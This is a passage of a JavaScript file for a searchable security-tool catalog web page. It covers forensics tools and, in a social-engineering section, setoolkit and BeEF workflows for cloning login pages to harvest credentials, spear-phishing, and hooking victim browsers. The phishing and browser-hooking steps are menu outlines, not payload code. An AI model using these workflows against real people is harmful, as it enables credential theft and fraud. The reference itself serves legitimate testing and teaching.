        howItWorks: 'Scans binary content and prints sequences of printable characters.',
        usage: 'strings binary | less',
        examples: [
          {
            command: 'strings -a firmware.bin | grep password',
            use: 'Search firmware for likely password strings or credentials.'
          },
          {
            command: 'strings file.exe | less',
            use: 'Inspect the readable output of an executable interactively.'
          },
          {
            command: 'strings -n 8 binary | sort | uniq -c | sort -nr',
            use: 'Find the most frequent strings in a binary to identify important text.'
          }
        ],
        notes: 'Often reveals filenames, URLs, or commands embedded in executables.'
      }
    ]
  },
  {
    title: 'Forensics',
    description: 'Investigate systems, recover files, and analyze evidence after an incident.',
    tools: [
      {
        name: 'autopsy',
        summary: 'Web-based digital forensics platform for disk and file analysis.',
        primaryUse: 'Review disk images and recover files through a browser interface.',
        howItWorks: 'Indexes disk images and exposes file system, timeline, and artifact analysis modules.',
        usage: 'autopsy',
        examples: [
          {
            command: 'Open Autopsy in a browser and create a new case',
            use: 'Start a new investigation and add evidence for analysis.'
          },
          {
            command: 'Add disk image and review extracted artifacts',
            use: 'Import a disk image and browse recovered files, timelines, and metadata.'
          },
          {
            command: 'Use the timeline view to correlate events',
            use: 'Visualize file activity and system changes during the incident window.'
          }
        ],
        notes: 'Good for structured forensic investigations and evidence reporting.'
      },
      {
        name: 'sleuthkit',
        summary: 'Command-line tools for filesystem and disk analysis.',
        primaryUse: 'Inspect file systems, recover deleted files, and analyze disk metadata.',
        howItWorks: 'Parses disk images and file systems to extract file listings, metadata, and deleted content.',
        usage: 'fls -r diskimage.img',
        examples: [
          {
            command: 'mmls diskimage.img',
            use: 'Display the partition layout of a disk image before digging into files.'
          },
          {
            command: 'fls -r diskimage.img',
            use: 'Recursively list files in the disk image filesystem.'
          },
          {
            command: 'icat diskimage.img 128 > recovered_file',
            use: 'Extract a specific file from the disk image by inode number.'
          }
        ],
        notes: 'Use in forensic workflows to examine filesystem evidence.'
      },
      {
        name: 'volatility',
        summary: 'Memory forensics framework for analyzing RAM images.',
        primaryUse: 'Extract processes, network connections, and loaded modules from memory dumps.',
        howItWorks: 'Parses memory snapshots and inspects volatile system state with plugins.',
        usage: 'volatility -f memory.img windows.pslist',
        examples: [
          {
            command: 'volatility -f memory.img windows.pslist',
            use: 'List running Windows processes from a memory image.'
          },
          {
            command: 'volatility -f memory.img windows.cmdline',
            use: 'Inspect command-line arguments used by processes in memory.'
          },
          {
            command: 'volatility -f memory.img windows.netstat',
            use: 'Reveal network connections and listening ports from the memory sample.'
          }
        ],
        notes: 'Focus on process lists and network artifacts for incident response.'
      },
      {
        name: 'foremost',
        summary: 'File carving tool to recover deleted files from disk images.',
        primaryUse: 'Extract files based on signature patterns from raw images.',
        howItWorks: 'Scans raw disks for known file headers and reconstructs files without filesystem metadata.',
        usage: 'foremost -i diskimage.img -o /tmp/recover',
        examples: [
          {
            command: 'foremost -t jpg,png,doc -i diskimage.img -o recovered',
            use: 'Recover specific file types from a disk image using signature matching.'
          },
          {
            command: 'foremost -v -i diskimage.img',
            use: 'Run a verbose carving operation to see recovery progress and details.'
          },
          {
            command: 'foremost -c configuration.conf -i diskimage.img',
            use: 'Use a custom carving configuration for rare or custom file types.'
          }
        ],
        notes: 'Great for recovering evidence from damaged or deleted storage.'
      },
      {
        name: 'pdf-parser',
        summary: 'Analyze PDF documents for embedded content and malicious scripts.',
        primaryUse: 'Inspect PDF internals and detect suspicious objects.',
        howItWorks: 'Parses PDF structure and displays embedded objects, streams, and JavaScript entries.',
        usage: 'pdf-parser.py suspicious.pdf',
        examples: [
          {
            command: 'pdf-parser.py -s /JavaScript suspicious.pdf',
            use: 'Search the PDF for JavaScript objects that may contain malicious code.'
          },
          {
            command: 'pdf-parser.py --search /Encrypt suspicious.pdf',
            use: 'Locate encryption-related objects to determine whether the PDF is password protected.'
          },
          {
            command: 'pdf-parser.py -o 5 suspicious.pdf',
            use: 'Display object number 5 from the PDF to inspect its contents.'
          }
        ],
        notes: 'Useful for analyzing potentially malicious or hidden PDF content.'
      }
    ]
  },
  {
    title: 'Social Engineering & Reporting',
    description: 'Create social engineering campaigns, manage findings, and generate assessment reports.',
    tools: [
      {
        name: 'social-engineer-toolkit',
        summary: 'Toolkit for building phishing pages, credential harvesting, and social engineering attacks.',
        primaryUse: 'Generate social engineering campaigns with ready-made templates.',
        howItWorks: 'Guides you through building cloned websites, emails, and malicious payloads for testing social engineering controls.',
        usage: 'setoolkit',
        examples: [
          {
            command: 'setoolkit -> Social-Engineering Attacks -> Website Attack Vectors',
            use: 'Launch a cloned website attack vector to capture credentials.'
          },
          {
            command: 'setoolkit -> Spear-Phishing Attack',
            use: 'Create a targeted email campaign for a specific victim or organization.'
          },
          {
            command: 'setoolkit -> Credential Harvester Attack Method',
            use: 'Host a fake login page that stores submitted credentials.'
          }
        ],
        notes: 'Should only be used in authorized social engineering engagements.'
      },
      {
        name: 'beef',
        summary: 'Browser exploitation framework for hooking and controlling web browsers.',
        primaryUse: 'Hook a target browser and execute browser-based tests.',
        howItWorks: 'Hosts a malicious web page and tracks browser sessions when victims visit it.',
        usage: 'beef-xss',
        examples: [
          {
            command: 'Open the Beef admin UI and send a hook URL',
            use: 'Host a malicious page and generate a link to hook victim browsers.'
          },
          {
            command: 'Use modules to capture credentials or fingerprint browsers',
            use: 'Run post-hook tests to gather browser data and user activity.'
          },
          {
            command: 'beef-xss -c beef/cfg',
            use: 'Start Beef with a custom configuration file.'
          }
        ],
        notes: 'A good tool for browser-based social engineering exercises.'
      },
      {
        name: 'dradis',
        summary: 'Collaboration and reporting platform for security testing teams.',
        primaryUse: 'Collect findings from tests into a collaborative report workspace.',
        howItWorks: 'Stores vulnerabilities, evidence, and notes centrally for team review and report generation.',
        usage: 'dradis',
        examples: [
          {
            command: 'Create a new project and import scanner output',
            use: 'Start a project and ingest results from tools like Nessus or Burp for reporting.'
          },
          {
            command: 'Use report templates to generate final documentation',
            use: 'Compile findings into a standardized report for delivery.'
          },
          {
            command: 'Share project notes with team members',
            use: 'Collaborate on findings and validate remediation steps together.'
          }
        ],
        notes: 'Helps standardize reporting across team assessments.'
      },
      {
        name: 'faraday',
        summary: 'Penetration test IDE to centralize and visualize assessment data.',
        primaryUse: 'Aggregate vulnerability data across tools into one dashboard.',
        howItWorks: 'Imports scan results and organizes them into a shared project for analysis and reporting.',
        usage: 'faraday-server',
        examples: [
          {
            command: 'faraday-manage create_workspace mytest',
            use: 'Create a new workspace for your current penetration test.'
          },
          {
            command: 'faraday-client --workspace mytest --report report.xml',
            use: 'Import a scanner report into the specified workspace.'
          },
          {
            command: 'faraday-client --workspace mytest --list-hosts',
            use: 'Review imported hosts and findings in the workspace.'
          }
        ],
        notes: 'Useful for large assessments with many tools and team members.'
      },
      {
        name: 'spiderfoot',
        summary: 'Automated OSINT reconnaissance and risk scoring tool.',
        primaryUse: 'Scan domains, IPs, and people to build threat profiles.',
        howItWorks: 'Uses modules to collect public data across web sources and presents linked results automatically.',
        usage: 'sf.py',
        examples: [
          {
            command: 'sf.py -s example.com -o result.html',
            use: 'Scan a domain and save the findings to an HTML report.'
          },
          {
            command: 'sf.py -l 127.0.0.1:8080 -s example.com',
            use: 'Run SpiderFoot locally and access the web interface on port 8080.'
          },
          {
            command: 'sf.py -s 10.0.0.5 --disable-geoip',
            use: 'Scan an IP address while skipping geo-location modules for speed.'
          }
        ],
        notes: 'Great for broad automated reconnaissance of exposed assets.'
      }
    ]
  }
];

const categoryContainer = document.getElementById('categorySection');
const categoryNav = document.getElementById('categoryNav');
const searchInput = document.getElementById('searchInput');
const clearSearch = document.getElementById('clearSearch');
const resultMeta = document.getElementById('resultMeta');
let activeCategory = 'All';

function normalizeText(value) {
  return String(value || '').toLowerCase();
}

function matchesSearch(field, query) {
  return normalizeText(field).includes(query);
}

function getMatchedTools(category, query) {
  return category.tools.filter(tool => {
    return [
      tool.name,
      tool.summary,
      tool.primaryUse,
      tool.usage,
      tool.notes,
      tool.howItWorks,
      category.title,
      category.description
    ].some(field => matchesSearch(field, query));
  });
}

function createCategoryButton(title) {
  const button = document.createElement('button');
  button.className = 'category-button';
  button.type = 'button';
  button.textContent = title;
  button.dataset.category = title;
  button.addEventListener('click', () => {
    activeCategory = title;
    renderCatalog(searchInput.value, title);
  });
  return button;
}

function buildCategoryNav() {
  categoryNav.innerHTML = '';
  categoryNav.appendChild(createCategoryButton('All'));
  categories.forEach(category => categoryNav.appendChild(createCategoryButton(category.title)));
}

function copyTextToClipboard(text, button) {
  const original = button.textContent;
  const restore = () => (button.textContent = original);

  if (navigator.clipboard && window.isSecureContext) {
    navigator.clipboard.writeText(text).then(() => {
      button.textContent = 'Copied!';
      setTimeout(restore, 1400);
    }).catch(() => {
      button.textContent = 'Failed';
      setTimeout(restore, 1400);
    });
    return;
  }

  const textarea = document.createElement('textarea');
  textarea.value = text;
  textarea.style.position = 'fixed';
  textarea.style.left = '-9999px';
  document.body.appendChild(textarea);
  textarea.select();
  document.execCommand('copy');
  document.body.removeChild(textarea);
  button.textContent = 'Copied!';
  setTimeout(restore, 1400);
}

function buildToolCard(tool) {
  const toolCard = document.createElement('article');
  toolCard.className = 'tool-card';

  const title = document.createElement('h4');
  title.textContent = tool.name;
  toolCard.appendChild(title);

  const summary = document.createElement('p');
  summary.textContent = tool.summary;
  toolCard.appendChild(summary);

  const primaryUse = document.createElement('p');
  primaryUse.innerHTML = `<strong>Primary use:</strong> ${tool.primaryUse}`;
  toolCard.appendChild(primaryUse);

  const codeWrap = document.createElement('div');
  codeWrap.className = 'code-wrap';

  const code = document.createElement('code');
  code.textContent = tool.usage;
  codeWrap.appendChild(code);

  const copyBtn = document.createElement('button');
  copyBtn.type = 'button';
  copyBtn.className = 'copy-btn';
  copyBtn.textContent = 'Copy';
  copyBtn.addEventListener('click', () => copyTextToClipboard(tool.usage, copyBtn));
  codeWrap.appendChild(copyBtn);

  toolCard.appendChild(codeWrap);

  const details = document.createElement('div');
  details.className = 'tool-details';
  details.hidden = true;

  if (tool.howItWorks) {
    const how = document.createElement('p');
    how.innerHTML = `<strong>How it works:</strong> ${tool.howItWorks}`;
    details.appendChild(how);
  }

  if (tool.examples && tool.examples.length) {
    const examplesLabel = document.createElement('p');
    examplesLabel.innerHTML = '<strong>Example commands:</strong>';
    details.appendChild(examplesLabel);

    const exampleList = document.createElement('ul');
    tool.examples.forEach(example => {
      const li = document.createElement('li');

      if (typeof example === 'string') {
        li.textContent = example;
      } else {
        const command = document.createElement('code');
        command.textContent = example.command;
        li.appendChild(command);

        if (example.use) {
          const useDesc = document.createElement('p');
          useDesc.textContent = example.use;
          useDesc.style.margin = '0.35rem 0 0';
          useDesc.style.color = 'var(--muted)';
          li.appendChild(useDesc);
        }
      }

      exampleList.appendChild(li);
    });
    details.appendChild(exampleList);
  }

  if (tool.notes) {
    const notes = document.createElement('p');
    notes.innerHTML = `<strong>Pro tip:</strong> ${tool.notes}`;
    details.appendChild(notes);
  }

  toolCard.appendChild(details);

  const toggleButton = document.createElement('button');
  toggleButton.className = 'toggle-details';
  toggleButton.type = 'button';
  toggleButton.textContent = 'Show details';
  toggleButton.addEventListener('click', () => {
    details.hidden = !details.hidden;
    toggleButton.textContent = details.hidden ? 'Show details' : 'Hide details';
  });
  toolCard.appendChild(toggleButton);

  return toolCard;
}

function buildCategoryCard(category) {
  const card = document.createElement('section');
  card.className = 'category-card';

  const title = document.createElement('h3');
  title.textContent = category.title;
  card.appendChild(title);

  const description = document.createElement('p');
  description.textContent = category.description;
  card.appendChild(description);

  const grid = document.createElement('div');
  grid.className = 'tool-grid';
  category.tools.forEach(tool => grid.appendChild(buildToolCard(tool)));
  card.appendChild(grid);

  return card;
}

function updateActiveCategoryButton() {
  categoryNav.querySelectorAll('.category-button').forEach(button => {
    button.classList.toggle('active', button.dataset.category === activeCategory);
  });
}

function renderCatalog(filterText = '', selectedCategory = 'All') {
  categoryContainer.innerHTML = '';
  const normalizedQuery = filterText.trim().toLowerCase();

  const filteredCategories = categories
    .map(category => {
      if (selectedCategory !== 'All' && category.title !== selectedCategory) {
        return null;
      }

      const tools = normalizedQuery ? getMatchedTools(category, normalizedQuery) : category.tools;
      return tools.length ? { ...category, tools } : null;
    })
    .filter(Boolean);

  updateActiveCategoryButton();

  if (!filteredCategories.length) {
    const emptyState = document.createElement('div');
    emptyState.className = 'no-results';
    emptyState.innerHTML = '<p>No tools matched your search or selected category. Try another keyword or clear the filter.</p>';
    categoryContainer.appendChild(emptyState);
    resultMeta.textContent = 'No results found.';
    return;
  }

  filteredCategories.forEach(category => categoryContainer.appendChild(buildCategoryCard(category)));

  const toolCount = filteredCategories.reduce((sum, category) => sum + category.tools.length, 0);
  resultMeta.textContent = selectedCategory === 'All'
    ? `Showing ${toolCount} tool${toolCount === 1 ? '' : 's'} across ${filteredCategories.length} categor${filteredCategories.length === 1 ? 'y' : 'ies'}.`
    : `Showing ${toolCount} tool${toolCount === 1 ? '' : 's'} in ${selectedCategory}.`;
}

searchInput.addEventListener('input', event => renderCatalog(event.target.value, activeCategory));
clearSearch.addEventListener('click', () => {
  searchInput.value = '';
  activeCategory = 'All';
  renderCatalog('', 'All');
});

buildCategoryNav();
renderCatalog();
